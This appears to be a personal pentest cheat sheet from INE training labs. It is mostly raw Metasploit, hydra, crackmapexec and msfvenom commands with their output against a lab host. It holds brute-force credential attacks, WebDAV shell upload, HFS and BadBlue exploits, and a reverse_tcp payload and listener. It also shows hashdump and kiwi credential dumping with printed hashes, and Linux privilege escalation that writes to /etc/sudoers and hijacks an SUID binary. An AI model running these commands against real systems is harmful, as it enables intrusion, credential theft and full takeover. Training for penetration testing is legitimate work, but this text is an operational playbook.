## davweb
 nmap --script http-enum -sV -p 80 demo.ine.local
    /webdav/
    
 msfconsole
     exploit/windows/iis/iis_webdav_upload_asp 
        HttpUsername => bob
        HttpPassword => password_123321
        RHOsTS => demo.ine.local
        path => /webdav/shell.asp
    run

scanner/smb/smb_login
   pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
   user_file => /usr/share/metasploit-framework/data/wordlists/unix_users.txt
      administrator:qwertyuiop

   windows/smb/psexec
      RHOSTS => demo.ine.local
      smbuser => administrator
      smbpass => qwertyuiop
         exploit

## rpd
   hydra rdp://demo.ine.local:3333 -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -s 3333
      login: sysadmin   password: samantha
      login: demo   password: victoria
      login: auditor   password: elizabeth
      login: administrator   password: qwertyuiop

   xfreerdp /u:administrador /p:qwertyuiop /v:demo.ine.local:3333

## winrm
   crackmapexec  winrm demo.ine.local -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
      WINRM       demo.ine.local  5985   SERVER           [+] server\administrator:tinkerbell (Pwn3d!)
      
   windows/winrm/winrm_script_exec
   

## elevate privilige
   searchsploit hfs

   use exploit/windows/http/rejetto_hfs_exec
      set RHOSTS demo.ine.local
      exploit
   
   ## sistem info
      getuid
      sysinfo

   ## Migrate to process with privilegy
      ps -S explorer.exe
      migrate 2352
   

   getsystem

   shell
      net localgroup administrators
   
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.3 LPORT=1234 -f exe -o payload.exe

   multi/handler
      set LPORT 4444
      set LHOST 10.10.41.9
      set PaYLOAD windows/meterpreter/reverse_tcp
      run

meterpreter > 
   getuid
      Server username: VICTIM\admin
   getsystem
      ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
   getuid
      Server username: NT AUTHORITY\SYSTEM
   migrate -N lsass.exe
      [*] Migrating from 756 to 684...
   hashdump
      admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
      Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
      meterpreter > 659c8124523a634e0ba68e64bb1d822f


## incognito
   load incognito
   list_tokens -u
   impersonate_token ATTACKDEFENSE\\Administrator 

   getuid
   cat C:\\Users\\Administrator\\Desktop\\flag.txt

## hta server (rce)
   use exploit/windows/misc/hta_server 
      [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
      [*] Using URL: http://10.10.37.10:8080/BHjlEgH2wf0GOoP.hta
   
##  windows/http/badblue_passthru
      run
         getuid 'get user id
         pgrep lsass ' search service lsass because it hae elevate priviligies
         migrate xxxx
         getuid
      load kiwi
         lsa_dump_sam

## psexec
   hasdump
      copy Hah:hash user
   psexec
      set SMBUser user
      set SMBPass hash:hash
      set taget Native upload
      
## ftp
   hydra ftp://demo.ine.local -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt     
      login: sysadmin   password: 654321
      login: rooty   password: qwerty
      login: demo   password: butterfly
      login: auditor   password: chocolate
      login: anon   password: purple
      login: administrator   password: tweety
      login: diag   password: tigger


## cors
   // Step 5: Find if a file with the same name exists on the system.
   student@target:/$ find / -name message
      /tmp/message
      find: '/var/lib/apt/lists/partial': Permission denied
      find: '/var/cache/ldconfig': Permission denied
      find: '/var/cache/apt/archives/partial': Permission denied
      find: '/var/spool/cron/crontabs': Permission denied
      /home/student/message
      find: '/proc/tty/driver': Permission denied
      find: '/proc/11/task/11/fd': Permission denied
      find: '/proc/11/task/11/fdinfo': Permission denied
      find: '/proc/11/task/11/ns': Permission denied
      find: '/proc/11/fd': Permission denied
      find: '/proc/11/map_files': Permission denied
      find: '/proc/11/fdinfo': Permission denied
      find: '/proc/11/ns': Permission denied
      find: '/root': Permission denied
      find: '/etc/ssl/private': Permission denied

   // Step 6: Observe that a file with the same name is present in the /tmp directory. On checking closely, it is clear that this file is being overwritten every minute.
   student@target:/$ cat tmp/message
      Hey!! you are not root :(
   
   student@target:/tmp$ ls -l
      total 4
      -rw-r--r-- 1 root root 26 Mar  6 15:36 message
      -rw-r--r-- 1 root root  0 Mar  6 15:26 ready
   
   // Step 7: This means there is some script/binary which is copying this file from the student home directory to /tmp directory. Search for that script. If this script is doing a simple copy operation, it must have the source destination of the file in it. Try to locate that by using the grep command. On trying on different directories one by one (i.e. /, etc, /opt) and on /usr directory, a match has been found.
   student@target:/tmp$ grep -nri "/tmp/message" /usr
      /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
      /usr/local/share/copy.sh:3:chmod 644 /tmp/message

   student@target:/usr/local/share$ ls -l
      total 12
      drwxr-xr-x 2 root root 4096 Sep 21  2018 ca-certificates
      -rwxrwxrwx 1 root root   74 Sep 23  2018 copy.sh
      drwxr-xr-x 1 root root 4096 Sep 21  2018 man
   
   student@target:/usr/local/share$ cat copy.sh
      #! /bin/bash
      cp /home/student/message /tmp/message
      chmod 644 /tmp/message

   // we used printf becuase the don't have a nano o vim, and we on't have permision to install it
   printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

   //verify permision
   sudo -l

   //elevate user
   sudo su

## binary
   student@target:~$ ls -l
      total 24
      -r-x------ 1 root root 8296 Sep 22  2018 greetings
      -rwsr-xr-x 1 root root 8344 Sep 22  2018 welcome
   student@target:~$ file welcome
      //obser that execute greetings with root privilegy
   rm greetings
   cp /bin/bash greetings
   ./wellcome

   // we obtein a root bash
   cd /root/flag

##
 sessions -u 1 //to get meterpreter
 use post/linux/gather/hashdump
   set SESSION 1
   exploit
use auxiliary/analyze/crack_linux
   set SHA512 true
   run